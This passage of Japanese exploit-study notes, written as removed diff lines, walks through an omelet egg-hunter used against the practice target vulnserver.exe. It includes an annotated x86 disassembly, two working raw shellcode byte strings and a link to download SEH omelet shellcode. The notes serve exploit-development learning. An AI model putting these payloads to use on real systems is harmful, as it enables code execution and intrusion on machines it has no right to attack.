-vulnserver.exeで動作したOmlet-Hunterは以下。   
-```txt
-   0:	83 e9 78             	sub    ecx,0x78 ; ECXがEggより高いアドレスだったため、
-   3:	83 e9 78             	sub    ecx,0x78 ; ecx-562することで、Eggより低いアドレスに設定
-   6:	83 e9 78             	sub    ecx,0x78 ; こうすると、Eggの近くから検索が開始されるので早く見つけられる！
-   9:	83 e9 78             	sub    ecx,0x78
-   c:	83 e9 52             	sub    ecx,0x52 
-   f:	89 cf                	mov    edi,ecx  ; ediが0x0の場合だと、0x00000000を参照しようとしてAccess-Violationとなった
-                                            ; そのため、ECXを活用して恣意的にEggの近くから探索を始めるようにする
-  11:	bb fd ff ff ff       	mov    ebx,0xfffffffd ; eggをすべて見つけた後でもループが終わらず、権限のないアドレスを参照
-                                                  ; してAccess-Violationとなったため、3回分のEggをカウントするようにする
-                                                  ; 0xffffffff-egg_size+1 をほかで使用してないEBXに代入
-  16:	eb 29                	jmp    0x41     ; [1]にジャンプ(SEHがうんたらかんたら？？)
-  18:	51                   	push   ecx      ; [3] <- jmp先
-  19:	64 89 20             	mov    DWORD PTR fs:[eax],esp
-  1c:	fc                   	cld    
-  1d:	b0 55                	mov    al,0x55  ; 0x55回、1バイトずつEggの指す分割Shellcodeからスタックに値をコピーする
-  1f:	f2 ae                	repnz scas al,BYTE PTR es:[edi] ; ediが0x1増える？よくわかってない…
-  21:	50                   	push   eax
-  22:	89 fe                	mov    esi,edi ; この時のediのアドレスがちょうどEggを指していればEggを発見できる
-  24:	ad                   	lods   eax,DWORD PTR ds:[esi] ; Eggかもしれない値をEaxに代入
-  25:	35 ff 55 da ba       	xor    eax,0xbada55ff ; eaxの値が0xbada55ffならEgg発見！
-  2a:	83 f8 03             	cmp    eax,0x3
-  2d:	77 12                	ja     0x41   ; [1]にジャンプ(Eggは発見できない場合)
-  2f:	59                   	pop    ecx ; Eggを発見した場合、以下の処理を実行
-  30:	f7 e9                	imul   ecx
-  32:	64 03 42 08          	add    eax,DWORD PTR fs:[edx+0x8]
-  36:	97                   	xchg   edi,eax
-  37:	f3 a4                	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi] ; 0x55回、1バイトずつスタックの最後にShellcodeの一部を書き込む
-  39:	83 fb ff             	cmp    ebx,0xffffffff  ; ebx=0xfffffffdが2回incされると、合計3個分発見したことになり、Shellcodeにジャンプ
-  3c:	74 2e                	je     0x6c     ; [5]にジャンプ(shellcode用の処理にジャンプ)
-  3e:	43                   	inc    ebx ; 0xfffffffdに0x1を足す。3個分のEggをカウントする
-  3f:	89 f7                	mov    edi,esi
-  41:	31 c0                	xor    eax,eax    ; [1] <- jmp先
-  43:	64 8b 08             	mov    ecx,DWORD PTR fs:[eax]
-  46:	89 cc                	mov    esp,ecx    ; [2] <- jmp先
-  48:	59                   	pop    ecx
-  49:	81 f9 ff ff ff ff    	cmp    ecx,0xffffffff ; SEHの最後の例外ハンドラの0xffffffffかどうか確認してる？
-  4f:	75 f5                	jne    0x46      ; [2]にジャンプ
-  51:	5a                   	pop    edx
-  52:	e8 c1 ff ff ff       	call   0x18   ; [3]にジャンプ(次のアドレスでEggを探す)
-  57:	61                   	popa          ; ここら辺に到達することなくね？？と思ってる。全然わからん…
-  　　　　　　　　　　　　　　　　　　　　　　; ここから、[5]まで省いても問題なくShellcode実行まで行けたわ…
-                                          ; 多分、魔改造した結果必要なくなったっぽい？？
-  58:	8d 66 18             	lea    esp,[esi+0x18]
-  5b:	58                   	pop    eax
-  5c:	66 0d ff 0f          	or     ax,0xfff
-  60:	40                   	inc    eax
-  61:	78 03                	js     0x66   ; [4]にジャンプ
-  63:	97                   	xchg   edi,eax
-  64:	eb db                	jmp    0x41   ; [1]にジャンプ
-  66:	31 c0                	xor    eax,eax ; [4] <- jmp先
-  68:	64 ff 50 08          	call   DWORD PTR fs:[eax+0x8] ; ここらへんはよくわからん
-  6c:	c1 ef 08             	shr    edi,0x8  ; [5] <- jmp先 Ediがshellcodeを指すように調整
-  6f:	c1 e7 08             	shl    edi,0x8
-  72:	ff e7                	jmp    edi      ; ediの指すShellcodeにジャンプして実行！
-
-\x83\xe9x\x83\xe9x\x83\xe9x\x83\xe9x\x83\xe9R\x89\xcf\xbb\xfd\xff\xff\xff\xeb)Qd\x89\xfc\xb0U\xf2\xaeP\x89\xfe\xad5\xffU\xda\xba\x83\xf8\x03w\x12Y\xf7\xe9d\x03B\x08\x97\xf3\xa4\x83\xfb\xfft.C\x89\xf71\xc0d\x8b\x08\x89\xccY\x81\xf9\xff\xff\xff\xffu\xf5Z\xe8\xc1\xff\xff\xffa\x8df\x18Xf\r\xff\x0f@x\x03\x97\xeb\xdb1\xc0d\xffP\x08\xc1\xef\x08\xc1\xe7\x08\xff\xe7
-
-以下の省略版のOmlet-HunterでもShellcode実行まで行けた！！
-相対JMPとかをうまく行くように調整したりした。
-\x83\xe9x\x83\xe9x\x83\xe9x\x83\xe9x\x83\xe9R\x89\xcf\xbb\xfd\xff\xff\xff\xeb)Qd\x89\xfc\xb0U\xf2\xaeP\x89\xfe\xad5\xffU\xda\xba\x83\xf8\x03w\x12Y\xf7\xe9d\x03B\x08\x97\xf3\xa4\x83\xfb\xfft\x19C\x89\xf71\xc0d\x8b\x08\x89\xccY\x81\xf9\xff\xff\xff\xffu\xf5Z\xe8\xc1\xff\xff\xff\xc1\xef\x08\xc1\xe7\x08\xff\xe7
-```
-SEH Omlet shellcodeは以下からダウンロードできる。   
-https://code.google.com/archive/p/w32-seh-omelet-shellcode/downloads   
 #### Windows周り
 ##### arwin
 - `arwin`   
